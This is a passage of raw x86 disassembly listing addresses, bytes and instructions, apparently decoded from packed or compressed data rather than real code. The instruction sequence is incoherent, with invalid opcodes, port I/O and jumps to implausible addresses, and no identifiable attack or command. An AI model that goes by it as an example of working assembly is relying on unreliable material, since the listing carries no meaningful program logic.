  42fb02:	81 13 11 74 f6 ec    	adcl   $0xecf67411,(%ebx)
  42fb08:	d8 82 52 c2 56 85    	fadds  -0x7aa93dae(%edx)
  42fb0e:	1c b6                	sbb    $0xb6,%al
  42fb10:	fb                   	sti
  42fb11:	96                   	xchg   %eax,%esi
  42fb12:	13 00                	adc    (%eax),%eax
  42fb14:	d8 5d 0b             	fcomps 0xb(%ebp)
  42fb17:	d2 02                	rolb   %cl,(%edx)
  42fb19:	53                   	push   %ebx
  42fb1a:	fb                   	sti
  42fb1b:	96                   	xchg   %eax,%esi
  42fb1c:	8b 56 90             	mov    -0x70(%esi),%edx
  42fb1f:	0e                   	push   %cs
  42fb20:	6e                   	outsb  %ds:(%esi),(%dx)
  42fb21:	26 09 d0             	es or  %edx,%eax
  42fb24:	2d c8 28 f5 a2       	sub    $0xa2f528c8,%eax
  42fb29:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42fb2a:	05 dc e5 b1 99       	add    $0x99b1e5dc,%eax
  42fb2f:	0d e0 45 5b 52       	or     $0x525b45e0,%eax
  42fb34:	de 2a                	fisubrs (%edx)
  42fb36:	61                   	popa
  42fb37:	54                   	push   %esp
  42fb38:	33 ba 32 4d 70 d6    	xor    -0x298fb2ce(%edx),%edi
  42fb3e:	45                   	inc    %ebp
  42fb3f:	fb                   	sti
  42fb40:	31 50 8c             	xor    %edx,-0x74(%eax)
  42fb43:	9c                   	pushf
  42fb44:	12 a1 d6 aa f9 fe    	adc    -0x106552a(%ecx),%ah
  42fb4a:	e1 a1                	loope  0x42faed
  42fb4c:	aa                   	stos   %al,%es:(%edi)
  42fb4d:	fb                   	sti
  42fb4e:	7b 83                	jnp    0x42fad3
  42fb50:	52                   	push   %edx
  42fb51:	d5 3e                	aad    $0x3e
  42fb53:	b4 70                	mov    $0x70,%ah
  42fb55:	74 84                	je     0x42fadb
  42fb57:	fd                   	std
  42fb58:	54                   	push   %esp
  42fb59:	b9 fa 30 29 a5       	mov    $0xa52930fa,%ecx
  42fb5e:	e2 6c                	loop   0x42fbcc
  42fb60:	b8 7e 34 4a 49       	mov    $0x494a347e,%eax
  42fb65:	72 ee                	jb     0x42fb55
  42fb67:	a1 13 aa 2c af       	mov    0xaf2caa13,%eax
  42fb6c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42fb6d:	dd 4a 7c             	fisttpll 0x7c(%edx)
  42fb70:	1e                   	push   %ds
  42fb71:	18 80 06 49 cd 5d    	sbb    %al,0x5dcd4906(%eax)
  42fb77:	c3                   	ret
  42fb78:	5e                   	pop    %esi
  42fb79:	a2 ce 7b 6a bf       	mov    %al,0xbf6a7bce
  42fb7e:	09 27                	or     %esp,(%edi)
  42fb80:	56                   	push   %esi
  42fb81:	88 c5                	mov    %al,%ch
  42fb83:	4d                   	dec    %ebp
  42fb84:	c4                   	(bad)
  42fb85:	ee                   	out    %al,(%dx)
  42fb86:	0c b2                	or     $0xb2,%al
  42fb88:	e7 f6                	out    %eax,$0xf6
  42fb8a:	0c f7                	or     $0xf7,%al
  42fb8c:	4d                   	dec    %ebp
  42fb8d:	f6 d3                	not    %bl
  42fb8f:	05 f7 89 12 07       	add    $0x71289f7,%eax
  42fb94:	d4 d1                	aam    $0xd1
  42fb96:	ea 6d 5e 4a fa ad 66 	ljmp   $0x66ad,$0xfa4a5e6d
  42fb9d:	3f                   	aas
  42fb9e:	ec                   	in     (%dx),%al
  42fb9f:	02 2b                	add    (%ebx),%ch
  42fba1:	22 90 67 62 04 58    	and    0x58046267(%eax),%dl
  42fba7:	b0 73                	mov    $0x73,%al
  42fba9:	85 44 7d db          	test   %eax,-0x25(%ebp,%edi,2)
  42fbad:	b0 0b                	mov    $0xb,%al
  42fbaf:	81 68 a2 00 07 b0 ec 	subl   $0xecb00700,-0x5e(%eax)
  42fbb6:	95                   	xchg   %eax,%ebp
  42fbb7:	60                   	pusha
  42fbb8:	c8 ca 53 e0          	enter  $0x53ca,$0xe0
  42fbbc:	bb 10 bd 22 d7       	mov    $0xd722bd10,%ebx
  42fbc1:	d5 0a                	aad    $0xa
  42fbc3:	ba 0e b2 1a a7       	mov    $0xa71ab20e,%edx
  42fbc8:	1a 42 d3             	sbb    -0x2d(%edx),%al
  42fbcb:	02 e6                	add    %dh,%ah
  42fbcd:	35 b1 36 b8 17       	xor    $0x17b836b1,%eax
  42fbd2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42fbd3:	d6                   	salc
  42fbd4:	7d f1                	jge    0x42fbc7
  42fbd6:	f3 3d c5 ad ec fb    	repz cmp $0xfbecadc5,%eax
  42fbdc:	6d                   	insl   (%dx),%es:(%edi)
  42fbdd:	5b                   	pop    %ebx
  42fbde:	3d b9 7a 31 86       	cmp    $0x86317ab9,%eax
  42fbe3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42fbe4:	c1 14 bc 98          	rcll   $0x98,(%esp,%edi,4)
  42fbe8:	69 cd 7c c1 0f 9a    	imul   $0x9a0fc17c,%ebp,%ecx
  42fbee:	83 2e 0f             	subl   $0xf,(%esi)
  42fbf1:	e1 24                	loope  0x42fc17
  42fbf3:	48                   	dec    %eax
  42fbf4:	63 e6                	arpl   %esp,%esi
  42fbf6:	aa                   	stos   %al,%es:(%edi)
  42fbf7:	49                   	dec    %ecx
  42fbf8:	f7 c3 fc 87 f8 f3    	test   $0xf3f887fc,%ebx
  42fbfe:	69 dd e9 cb 0f 5a    	imul   $0x5a0fcbe9,%ebp,%ebx
  42fc04:	51                   	push   %ecx
  42fc05:	eb 2b                	jmp    0x42fc32
  42fc07:	06                   	push   %es
  42fc08:	ab                   	stos   %eax,%es:(%edi)
  42fc09:	b0 d8                	mov    $0xd8,%al
  42fc0b:	7e 3e                	jle    0x42fc4b
  42fc0d:	dc bb 55 34 5a 22    	fdivrl 0x225a3455(%ebx)
  42fc13:	ea 34 bd 36 aa 0e 86 	ljmp   $0x860e,$0xaa36bd34
  42fc1a:	22 29                	and    (%ecx),%ch
  42fc1c:	1e                   	push   %ds
  42fc1d:	be ec 60 81 a4       	mov    $0xa48160ec,%esi
  42fc22:	1c 59                	sbb    $0x59,%al
  42fc24:	eb 78                	jmp    0x42fc9e
  42fc26:	98                   	cwtl
  42fc27:	7b 41                	jnp    0x42fc6a
  42fc29:	02 1a                	add    (%edx),%bl
  42fc2b:	ad                   	lods   %ds:(%esi),%eax
  42fc2c:	0d 07 72 3e 6f       	or     $0x6f3e7207,%eax
  42fc31:	0f f0                	(bad)
  42fc33:	81 25 ee 31 1f b1 63 	andl   $0xc42d7463,0xb11f31ee
  42fc3a:	74 2d c4 
  42fc3d:	86 06                	xchg   %al,(%esi)
  42fc3f:	18 d5                	sbb    %dl,%ch
  42fc41:	4c                   	dec    %esp
  42fc42:	2f                   	das
  42fc43:	d4 f8                	aam    $0xf8
  42fc45:	4f                   	dec    %edi
  42fc46:	a0 f7 66 f0 71       	mov    0x71f066f7,%al
  42fc4b:	bf 8e 44 cc 51       	mov    $0x51cc448e,%edi
  42fc50:	3e 0f 61 08          	punpcklwd %ds:(%eax),%mm1
  42fc54:	21 d2                	and    %edx,%edx
  42fc56:	85 a3 e9 cb 8e 32    	test   %esp,0x328ecbe9(%ebx)
  42fc5c:	95                   	xchg   %eax,%ebp
  42fc5d:	b4 26                	mov    $0x26,%ah
  42fc5f:	cd ce                	int    $0xce
  42fc61:	56                   	push   %esi
  42fc62:	24 10                	and    $0x10,%al
  42fc64:	ee                   	out    %al,(%dx)
  42fc65:	94                   	xchg   %eax,%esp
  42fc66:	97                   	xchg   %eax,%edi
  42fc67:	a1 b3 56 82 1e       	mov    0x1e8256b3,%eax
  42fc6c:	2d 49 f5 f5 24       	sub    $0x24f5f549,%eax
  42fc71:	87 5c 77 57          	xchg   %ebx,0x57(%edi,%esi,2)
  42fc75:	6c                   	insb   (%dx),%es:(%edi)
  42fc76:	35 d0 c2 86 4a       	xor    $0x4a86c2d0,%eax
  42fc7b:	df e9                	fucomip %st(1),%st
  42fc7d:	92                   	xchg   %eax,%edx
  42fc7e:	0e                   	push   %cs
  42fc7f:	2a cf                	sub    %bh,%cl
  42fc81:	0a 10                	or     (%eax),%dl
  42fc83:	94                   	xchg   %eax,%esp
  42fc84:	ac                   	lods   %ds:(%esi),%al
  42fc85:	22 a2 04 c3 0f f3    	and    -0xcf03cfc(%edx),%ah
  42fc8b:	11 a4 88 df 0a c0 26 	adc    %esp,0x26c00adf(%eax,%ecx,4)
  42fc92:	0a b3 0b fe 16 c9    	or     -0x36e901f5(%ebx),%dh
  42fc98:	28 14 f4             	sub    %dl,(%esp,%esi,8)
  42fc9b:	04 76                	add    $0x76,%al
  42fc9d:	4c                   	dec    %esp
  42fc9e:	e8 55 4e 71 c4       	call   0xc4b44af8
  42fca3:	01 86 7f 6b 02 0a    	add    %eax,0xa026b7f(%esi)
  42fca9:	ed                   	in     (%dx),%eax
  42fcaa:	cf                   	iret
  42fcab:	5b                   	pop    %ebx
  42fcac:	c4 0a                	les    (%edx),%ecx
  42fcae:	5d                   	pop    %ebp
  42fcaf:	b4 b0                	mov    $0xb0,%ah
  42fcb1:	77 a8                	ja     0x42fc5b
  42fcb3:	60                   	pusha
  42fcb4:	77 78                	ja     0x42fd2e
  42fcb6:	2a b5 2d ee 63 3e    	sub    0x3e63ee2d(%ebp),%dh
  42fcbc:	0d 1b c8 b4 8a       	or     $0x8ab4c81b,%eax
  42fcc1:	c3                   	ret
  42fcc2:	99                   	cltd
  42fcc3:	b0 28                	mov    $0x28,%al
  42fcc5:	f1                   	int1
  42fcc6:	16                   	push   %ss
  42fcc7:	34 e7                	xor    $0xe7,%al
  42fcc9:	c6                   	(bad)
  42fcca:	f0 1f                	lock pop %ds
  42fccc:	34 47                	xor    $0x47,%al
  42fcce:	20 8c 84 c5 12 cc e5 	and    %cl,-0x1a33ed3b(%esp,%eax,4)
  42fcd5:	f6 fe                	idiv   %dh
  42fcd7:	51                   	push   %ecx
  42fcd8:	67 b3 39             	addr16 mov $0x39,%bl
  42fcdb:	4b                   	dec    %ebx
  42fcdc:	37                   	aaa
  42fcdd:	aa                   	stos   %al,%es:(%edi)
  42fcde:	f9                   	stc
  42fcdf:	fd                   	std
  42fce0:	c1 3b 63             	sarl   $0x63,(%ebx)
  42fce3:	5a                   	pop    %edx
  42fce4:	31 7a cb             	xor    %edi,-0x35(%edx)
  42fce7:	b0 a6                	mov    $0xa6,%al
  42fce9:	e2 c7                	loop   0x42fcb2
  42fceb:	40                   	inc    %eax
  42fcec:	0d db 94 72 60       	or     $0x607294db,%eax
  42fcf1:	15 83 00 84 40       	adc    $0x40840083,%eax
  42fcf6:	97                   	xchg   %eax,%edi
  42fcf7:	ce                   	into
  42fcf8:	72 e3                	jb     0x42fcdd
  42fcfa:	09 1d ad 63 9f be    	or     %ebx,0xbe9f63ad
  42fd00:	c0 1e e1             	rcrb   $0xe1,(%esi)
  42fd03:	10 68 02             	adc    %ch,0x2(%eax)
  42fd06:	25 d0 be 98 2c       	and    $0x2c98bed0,%eax
  42fd0b:	ad                   	lods   %ds:(%esi),%eax
  42fd0c:	d3 d1                	rcl    %cl,%ecx
  42fd0e:	e3 9e                	jecxz  0x42fcae
  42fd10:	ab                   	stos   %eax,%es:(%edi)
  42fd11:	56                   	push   %esi
  42fd12:	bc 05 00 14 78       	mov    $0x78140005,%esp
  42fd17:	d2 b7 aa 1c 39 f7    	shlb   %cl,-0x8c6e356(%edi)
  42fd1d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42fd1e:	c2 22 83             	ret    $0x8322
  42fd21:	fe 88 d9 86 18 b9    	decb   -0x46e77927(%eax)
  42fd27:	33 81 94 50 b9 86    	xor    -0x7946af6c(%ecx),%eax
  42fd2d:	fd                   	std
  42fd2e:	2b 37                	sub    (%edi),%esi
  42fd30:	98                   	cwtl
  42fd31:	89 d1                	mov    %edx,%ecx
  42fd33:	ff 74 a2 89          	push   -0x77(%edx,%eiz,4)
  42fd37:	8a 08                	mov    (%eax),%cl
  42fd39:	20 09                	and    %cl,(%ecx)
  42fd3b:	26 62 78 54          	bound  %edi,%es:0x54(%eax)
  42fd3f:	72 fd                	jb     0x42fd3e
  42fd41:	aa                   	stos   %al,%es:(%edi)
  42fd42:	0b e0                	or     %eax,%esp
  42fd44:	1d ac 56 b1 a7       	sbb    $0xa7b156ac,%eax
  42fd49:	bf 43 bf 91 40       	mov    $0x4091bf43,%edi
  42fd4e:	22 82 45 d9 62 0f    	and    0xf62d945(%edx),%al
  42fd54:	f1                   	int1
  42fd55:	8d 25 fb 9c 86 ce    	lea    0xce869cfb,%esp
  42fd5b:	48                   	dec    %eax
  42fd5c:	9c                   	pushf
  42fd5d:	5d                   	pop    %ebp
  42fd5e:	f0 98                	lock cwtl
  42fd60:	11 13                	adc    %edx,(%ebx)
  42fd62:	cf                   	iret
  42fd63:	f8                   	clc
  42fd64:	7a bc                	jp     0x42fd22
  42fd66:	6e                   	outsb  %ds:(%esi),(%dx)
  42fd67:	df 48 02             	fisttps 0x2(%eax)
  42fd6a:	d9 7f 77             	fnstcw 0x77(%edi)
  42fd6d:	00 c7                	add    %al,%bh
  42fd6f:	5e                   	pop    %esi
  42fd70:	75 28                	jne    0x42fd9a
  42fd72:	0d 8e 40 b6 4a       	or     $0x4ab6408e,%eax
  42fd77:	09 a9 36 e3 bc a6    	or     %ebp,-0x59431cca(%ecx)
  42fd7d:	22 c3                	and    %bl,%al
  42fd7f:	34 05                	xor    $0x5,%al
  42fd81:	20 ac 18 40 24 73 f2 	and    %ch,-0xd8cdbc0(%eax,%ebx,1)
  42fd88:	fb                   	sti
  42fd89:	6b 57 d0 c1          	imul   $0xffffffc1,-0x30(%edi),%edx
  42fd8d:	3f                   	aas
  42fd8e:	aa                   	stos   %al,%es:(%edi)
  42fd8f:	08 cc                	or     %cl,%ah
  42fd91:	f0 2f                	lock das
  42fd93:	60                   	pusha
  42fd94:	cd 22                	int    $0x22
  42fd96:	42                   	inc    %edx
  42fd97:	61                   	popa
  42fd98:	2c 4d                	sub    $0x4d,%al
  42fd9a:	cf                   	iret
  42fd9b:	1e                   	push   %ds
  42fd9c:	07                   	pop    %es
  42fd9d:	bd 20 cc 30 15       	mov    $0x1530cc20,%ebp
  42fda2:	b4 58                	mov    $0x58,%ah
  42fda4:	89 c8                	mov    %ecx,%eax
  42fda6:	30 b8 a4 da 18 28    	xor    %bh,0x2818daa4(%eax)
  42fdac:	ff                   	ljmp   (bad)
  42fdad:	eb eb                	jmp    0x42fd9a
  42fdaf:	57                   	push   %edi
  42fdb0:	e1 e1                	loope  0x42fd93
  42fdb2:	3a 6f 3d             	cmp    0x3d(%edi),%ch
  42fdb5:	14 b5                	adc    $0xb5,%al
  42fdb7:	03 ea                	add    %edx,%ebp
  42fdb9:	99                   	cltd
  42fdba:	56                   	push   %esi
  42fdbb:	f7 7c ae a6          	idivl  -0x5a(%esi,%ebp,4)
  42fdbf:	b4 58                	mov    $0x58,%ah
  42fdc1:	1a ec                	sbb    %ah,%ch
  42fdc3:	3d 01 60 06 f4       	cmp    $0xf4066001,%eax
  42fdc8:	aa                   	stos   %al,%es:(%edi)
  42fdc9:	ae                   	scas   %es:(%edi),%al
  42fdca:	77 ed                	ja     0x42fdb9
  42fdcc:	55                   	push   %ebp
  42fdcd:	bd 38 1c 81 88       	mov    $0x88811c38,%ebp
  42fdd2:	63 ef                	arpl   %ebp,%edi
  42fdd4:	a0 6a 10 b2 10       	mov    0x10b2106a,%al
  42fdd9:	7b 02                	jnp    0x42fddd
  42fddb:	1f                   	pop    %ds
  42fddc:	84 69 8e             	test   %ch,-0x72(%ecx)
  42fddf:	ac                   	lods   %ds:(%esi),%al
  42fde0:	75 a7                	jne    0x42fd89
  42fde2:	0d f3 82 26 f8       	or     $0xf82682f3,%eax
  42fde7:	7a 57                	jp     0x42fe40
  42fde9:	d9 cd                	fxch   %st(5)
  42fdeb:	f6 b1 d0 54 d8 78    	divb   0x78d854d0(%ecx)
  42fdf1:	e0 1b                	loopne 0x42fe0e
  42fdf3:	a8 86                	test   $0x86,%al
  42fdf5:	d3 57 9a             	rcll   %cl,-0x66(%edi)
  42fdf8:	cf                   	iret
  42fdf9:	95                   	xchg   %eax,%ebp
  42fdfa:	6c                   	insb   (%dx),%es:(%edi)
  42fdfb:	64 5e                	fs pop %esi
  42fdfd:	08 50 1e             	or     %dl,0x1e(%eax)
  42fe00:	97                   	xchg   %eax,%edi
  42fe01:	cd e2                	int    $0xe2
  42fe03:	7c 06                	jl     0x42fe0b
  42fe05:	dd c3                	ffree  %st(3)
  42fe07:	02 da                	add    %dl,%bl
  42fe09:	b4 20                	mov    $0x20,%ah
  42fe0b:	8e 8a af 7f 11 6d    	mov    0x6d117faf(%edx),%cs
  42fe11:	35 ee ad 78 2a       	xor    $0x2a78adee,%eax
  42fe16:	7e 39                	jle    0x42fe51
  42fe18:	bc 05 4e 28 a2       	mov    $0xa2284e05,%esp
  42fe1d:	03 6a 55             	add    0x55(%edx),%ebp
  42fe20:	87 9b 9f 35 e7 38    	xchg   %ebx,0x38e7359f(%ebx)
  42fe26:	56                   	push   %esi
  42fe27:	ce                   	into
  42fe28:	7a 44                	jp     0x42fe6e
  42fe2a:	63 56 ff             	arpl   %edx,-0x1(%esi)
  42fe2d:	c9                   	leave
  42fe2e:	06                   	push   %es
  42fe2f:	ac                   	lods   %ds:(%esi),%al
  42fe30:	d7                   	xlat   %ds:(%ebx)
  42fe31:	1f                   	pop    %ds
  42fe32:	14 4b                	adc    $0x4b,%al
  42fe34:	3e 8c 2c b1          	mov    %gs,%ds:(%ecx,%esi,4)
  42fe38:	ff e1                	jmp    *%ecx
  42fe3a:	54                   	push   %esp
  42fe3b:	f3 33 5d 38          	repz xor 0x38(%ebp),%ebx
  42fe3f:	04 00                	add    $0x0,%al
  42fe41:	d1 c2                	rol    $1,%edx
  42fe43:	49                   	dec    %ecx
  42fe44:	b1 87                	mov    $0x87,%cl
  42fe46:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42fe47:	10 05 e0 e6 3a 24    	adc    %al,0x243ae6e0
  42fe4d:	69 97 ca d4 c1 cc ca 	imul   $0x1122d1ca,-0x333e2b36(%edi),%edx
  42fe54:	d1 22 11 
  42fe57:	e3 aa                	jecxz  0x42fe03
  42fe59:	48                   	dec    %eax
  42fe5a:	df 7d 42             	fistpll 0x42(%ebp)
  42fe5d:	5f                   	pop    %edi
  42fe5e:	19 1f                	sbb    %ebx,(%edi)
  42fe60:	1d 7d 5d 54 c8       	sbb    $0xc8545d7d,%eax
  42fe65:	96                   	xchg   %eax,%esi
  42fe66:	34 c5                	xor    $0xc5,%al
  42fe68:	52                   	push   %edx
  42fe69:	89 5b 80             	mov    %ebx,-0x80(%ebx)
  42fe6c:	af                   	scas   %es:(%edi),%eax
  42fe6d:	68 28 72 c0 f8       	push   $0xf8c07228
  42fe72:	47                   	inc    %edi
  42fe73:	07                   	pop    %es
  42fe74:	11 5a fe             	adc    %ebx,-0x2(%edx)
  42fe77:	50                   	push   %eax
  42fe78:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42fe79:	75 3e                	jne    0x42feb9
  42fe7b:	a8 9f                	test   $0x9f,%al
  42fe7d:	b6 3a                	mov    $0x3a,%dh
  42fe7f:	63 53 bf             	arpl   %edx,-0x41(%ebx)
  42fe82:	b7 58                	mov    $0x58,%bh
  42fe84:	da c5                	fcmovb %st(5),%st
  42fe86:	28 22                	sub    %ah,(%edx)
  42fe88:	2e 17                	cs pop %ss
  42fe8a:	a8 e3                	test   $0xe3,%al
  42fe8c:	cd 4e                	int    $0x4e
  42fe8e:	70 31                	jo     0x42fec1
  42fe90:	7b 68                	jnp    0x42fefa
  42fe92:	9d                   	popf
  42fe93:	d4 0d                	aam    $0xd
  42fe95:	cc                   	int3
  42fe96:	e8 19 06 c9 cb       	call   0xcc0c04b4
  42fe9b:	04 f9                	add    $0xf9,%al
  42fe9d:	e3 48                	jecxz  0x42fee7
  42fe9f:	04 08                	add    $0x8,%al
  42fea1:	75 fe                	jne    0x42fea1
  42fea3:	04 7f                	add    $0x7f,%al
  42fea5:	35 f5 22 27 33       	xor    $0x332722f5,%eax
  42feaa:	8d 53 d7             	lea    -0x29(%ebx),%edx
  42fead:	8f 06                	pop    (%esi)
  42feaf:	0b 16                	or     (%esi),%edx
  42feb1:	70 31                	jo     0x42fee4
  42feb3:	22 fe                	and    %dh,%bh
  42feb5:	14 83                	adc    $0x83,%al
  42feb7:	44                   	inc    %esp
  42feb8:	06                   	push   %es
  42feb9:	9f                   	lahf
  42feba:	13 09                	adc    (%ecx),%ecx
  42febc:	03 49 75             	add    0x75(%ecx),%ecx
  42febf:	a9 a5 b0 0d 0e       	test   $0xe0db0a5,%eax
  42fec4:	e7 64                	out    %eax,$0x64
  42fec6:	57                   	push   %edi
  42fec7:	9d                   	popf
  42fec8:	15 d5 2e 96 bc       	adc    $0xbc962ed5,%eax
  42fecd:	9d                   	popf
  42fece:	be de e6 ec a3       	mov    $0xa3ece6de,%esi
  42fed3:	1f                   	pop    %ds
  42fed4:	55                   	push   %ebp
  42fed5:	5d                   	pop    %ebp
  42fed6:	37                   	aaa
  42fed7:	67 35 00 45 4b ac    	addr16 xor $0xac4b4500,%eax
  42fedd:	c3                   	ret
  42fede:	50                   	push   %eax
  42fedf:	c8 51 bd 9f          	enter  $0xbd51,$0x9f
  42fee3:	aa                   	stos   %al,%es:(%edi)
  42fee4:	7d 37                	jge    0x42ff1d
  42fee6:	01 1b                	add    %ebx,(%ebx)
  42fee8:	84 2b                	test   %ch,(%ebx)
  42feea:	fc                   	cld
  42feeb:	b9 1f 76 9f 0c       	mov    $0xc9f761f,%ecx
  42fef0:	37                   	aaa
  42fef1:	18 9e 65 f2 a3 96    	sbb    %bl,-0x695c0d9b(%esi)
  42fef7:	42                   	inc    %edx
  42fef8:	e8 60 21 0f c4       	call   0xc452205d
  42fefd:	7c 11                	jl     0x42ff10
  42feff:	d2 6f 8e             	shrb   %cl,-0x72(%edi)
  42ff02:	66 2c 1c             	data16 sub $0x1c,%al
  42ff05:	7d 3f                	jge    0x42ff46
  42ff07:	6e                   	outsb  %ds:(%esi),(%dx)
  42ff08:	11 b5 da 5c 50 6c    	adc    %esi,0x6c505cda(%ebp)
  42ff0e:	ca 06 75             	lret   $0x7506
  42ff11:	04 8a                	add    $0x8a,%al
  42ff13:	ff 34 93             	push   (%ebx,%edx,4)
  42ff16:	39 55 52             	cmp    %edx,0x52(%ebp)
  42ff19:	89 2d 82 25 55 2a    	mov    %ebp,0x2a552582
  42ff1f:	66 e8 74 c4          	callw  0xc397
  42ff23:	6a df                	push   $0xffffffdf
  42ff25:	e7 0f                	out    %eax,$0xf
  42ff27:	1f                   	pop    %ds
  42ff28:	bb 97 03 ae 9d       	mov    $0x9dae0397,%ebx
  42ff2d:	b0 36                	mov    $0x36,%al
  42ff2f:	07                   	pop    %es
  42ff30:	4f                   	dec    %edi
  42ff31:	a8 7d                	test   $0x7d,%al
  42ff33:	34 a4                	xor    $0xa4,%al
  42ff35:	c9                   	leave
  42ff36:	cd 1d                	int    $0x1d
  42ff38:	c2 7e fb             	ret    $0xfb7e
  42ff3b:	53                   	push   %ebx
  42ff3c:	f0 e8 9d a0 85 44    	lock call 0x44c89fdf
  42ff42:	01 dd                	add    %ebx,%ebp
  42ff44:	8b 8f b9 8a 8a d0    	mov    -0x2f757547(%edi),%ecx
  42ff4a:	5c                   	pop    %esp
  42ff4b:	ac                   	lods   %ds:(%esi),%al
  42ff4c:	13 3a                	adc    (%edx),%edi
  42ff4e:	89 f4                	mov    %esi,%esp
  42ff50:	44                   	inc    %esp
  42ff51:	c4 57 e7             	les    -0x19(%edi),%edx
  42ff54:	9e                   	sahf
  42ff55:	71 17                	jno    0x42ff6e
  42ff57:	ff 1f                	lcall  *(%edi)
  42ff59:	05 70 05 4b 3d       	add    $0x3d4b0570,%eax
  42ff5e:	ed                   	in     (%dx),%eax
  42ff5f:	01 92 73 0d 0e f9    	add    %edx,-0x6f1f28d(%edx)
  42ff65:	47                   	inc    %edi
  42ff66:	62 ee 92             	(bad) {rz-bad},{%k2}
  42ff69:	72 c0                	jb     0x42ff2b
  42ff6b:	a3 3e da 70 0f       	mov    %eax,0xf70da3e
  42ff70:	ba da ca 2b 26       	mov    $0x262bcada,%edx
  42ff75:	03 f2                	add    %edx,%esi
  42ff77:	f1                   	int1
  42ff78:	f8                   	clc
  42ff79:	90                   	nop
  42ff7a:	0b a7 86 36 9c d3    	or     -0x2c63c97a(%edi),%esp
  42ff80:	2c 45                	sub    $0x45,%al
  42ff82:	82 20 dc             	andb   $0xdc,(%eax)
  42ff85:	85 dc                	test   %ebx,%esp
  42ff87:	8b dc                	mov    %esp,%ebx
  42ff89:	b7 87                	mov    $0x87,%bh
  42ff8b:	8d 16                	lea    (%esi),%edx
  42ff8d:	de eb                	fsubrp %st,%st(3)
  42ff8f:	f5                   	cmc
  42ff90:	e3 9a                	jecxz  0x42ff2c
  42ff92:	09 79 e4             	or     %edi,-0x1c(%ecx)
  42ff95:	ee                   	out    %al,(%dx)
  42ff96:	17                   	pop    %ss
  42ff97:	10 65 45             	adc    %ah,0x45(%ebp)
  42ff9a:	28 66 ee             	sub    %ah,-0x12(%esi)
  42ff9d:	44                   	inc    %esp
  42ff9e:	c5 70 5c             	lds    0x5c(%eax),%esi
  42ffa1:	2e 01 dd             	cs add %ebx,%ebp
  42ffa4:	38 3d ec fa e0 0f    	cmp    %bh,0xfe0faec
  42ffaa:	16                   	push   %ss
  42ffab:	4f                   	dec    %edi
  42ffac:	48                   	dec    %eax
  42ffad:	be b5 f9 34 b2       	mov    $0xb234f9b5,%esi
  42ffb2:	20 c2                	and    %al,%dl
  42ffb4:	fe                   	(bad)
  42ffb5:	bc 73 d7 99 35       	mov    $0x3599d773,%esp
  42ffba:	02 d7                	add    %bh,%dl
  42ffbc:	6f                   	outsl  %ds:(%esi),(%dx)
  42ffbd:	e3 a1                	jecxz  0x42ff60
  42ffbf:	06                   	push   %es
  42ffc0:	55                   	push   %ebp
  42ffc1:	52                   	push   %edx
  42ffc2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42ffc3:	55                   	push   %ebp
  42ffc4:	68 b7 52 63 38       	push   $0x386352b7
  42ffc9:	1a 0a                	sbb    (%edx),%cl
  42ffcb:	c7 47 97 54 c6 0a cb 	movl   $0xcb0ac654,-0x69(%edi)
  42ffd2:	ba c5 56 04 ab       	mov    $0xab0456c5,%edx
  42ffd7:	6d                   	insl   (%dx),%es:(%edi)
  42ffd8:	e4 42                	in     $0x42,%al
  42ffda:	e3 8d                	jecxz  0x42ff69
  42ffdc:	0a a5 37 f9 ea 4e    	or     0x4eeaf937(%ebp),%ah
  42ffe2:	9c                   	pushf
  42ffe3:	00 d8                	add    %bl,%al
  42ffe5:	41                   	inc    %ecx
  42ffe6:	c7                   	(bad)
  42ffe7:	7f 45                	jg     0x43002e
  42ffe9:	de 1e                	ficomps (%esi)
  42ffeb:	62 91 29 25 92 05    	bound  %edx,0x5922529(%ecx)
  42fff1:	1c ee                	sbb    $0xee,%al
  42fff3:	5e                   	pop    %esi
  42fff4:	c8 29 fb d4          	enter  $0xfb29,$0xd4
  42fff8:	c5 2a                	lds    (%edx),%ebp
  42fffa:	7c cf                	jl     0x42ffcb
  42fffc:	0d df 9a 1c ba       	or     $0xba1c9adf,%eax
  430001:	38 eb                	cmp    %ch,%bl
  430003:	33 b8 6c 3e 0e bc    	xor    -0x43f1c194(%eax),%edi
  430009:	0f 19 c7             	nop    %edi
  43000c:	6d                   	insl   (%dx),%es:(%edi)
  43000d:	ce                   	into
  43000e:	89 4c 5a 54          	mov    %ecx,0x54(%edx,%ebx,2)
  430012:	88 fc                	mov    %bh,%ah
  430014:	2c e6                	sub    $0xe6,%al
  430016:	62 38                	bound  %edi,(%eax)
  430018:	37                   	aaa
  430019:	4c                   	dec    %esp
  43001a:	fc                   	cld
  43001b:	dc 1a                	fcompl (%edx)
  43001d:	07                   	pop    %es
  43001e:	ed                   	in     (%dx),%eax
  43001f:	48                   	dec    %eax
  430020:	92                   	xchg   %eax,%edx
  430021:	fe                   	(bad)
  430022:	1b 76 29             	sbb    0x29(%esi),%esi
  430025:	93                   	xchg   %eax,%ebx
  430026:	82 92 f4 13 53 36 9c 	adcb   $0x9c,0x365313f4(%edx)
  43002d:	2b 98 fe f1 6c 66    	sub    0x666cf1fe(%eax),%ebx
  430033:	73 10                	jae    0x430045
  430035:	c4 47 30             	les    0x30(%edi),%eax
  430038:	89 47 46             	mov    %eax,0x46(%edi)
  43003b:	ce                   	into
  43003c:	b8 21 a5 f7 13       	mov    $0x13f7a521,%eax
  430041:	ae                   	scas   %es:(%edi),%al
  430042:	75 5f                	jne    0x4300a3
  430044:	c1 b8 99 8f 83 18 04 	sarl   $0x4,0x18838f99(%eax)
  43004b:	b1 94                	mov    $0x94,%cl
  43004d:	5f                   	pop    %edi
  43004e:	95                   	xchg   %eax,%ebp
  43004f:	74 6c                	je     0x4300bd
  430051:	ef                   	out    %eax,(%dx)
  430052:	4d                   	dec    %ebp
  430053:	dd 90 1d e8 3f c9    	fstl   -0x36c017e3(%eax)
  430059:	c2 40 44             	ret    $0x4440
  43005c:	49                   	dec    %ecx
  43005d:	c2 e3 9c             	ret    $0x9ce3
  430060:	bf 28 8d 3a 6f       	mov    $0x6f3a8d28,%edi
  430065:	b6 1c                	mov    $0x1c,%dh
  430067:	12 34 b3             	adc    (%ebx,%esi,4),%dh
  43006a:	9e                   	sahf
  43006b:	8a a7 08 41 29 bf    	mov    -0x40d6bef8(%edi),%ah
